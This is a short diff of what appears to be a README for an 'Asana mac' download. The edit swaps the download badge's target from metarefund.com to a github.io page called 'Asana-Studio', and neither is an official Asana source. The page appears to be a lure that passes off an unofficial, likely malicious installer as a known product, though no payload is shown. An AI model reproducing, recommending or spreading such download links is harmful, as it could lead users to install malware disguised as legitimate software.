@@ -2,7 +2,7 @@
 
 Asana mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Asana mac](https://img.shields.io/badge/Download-Asana_mac-blueviolet)](https://metarefund.com/)
+[![Download Asana mac](https://img.shields.io/badge/Download-Asana_mac-blueviolet)](https://wildingisabel6.github.io/.github/Asana-Studio)
 
 ---
 
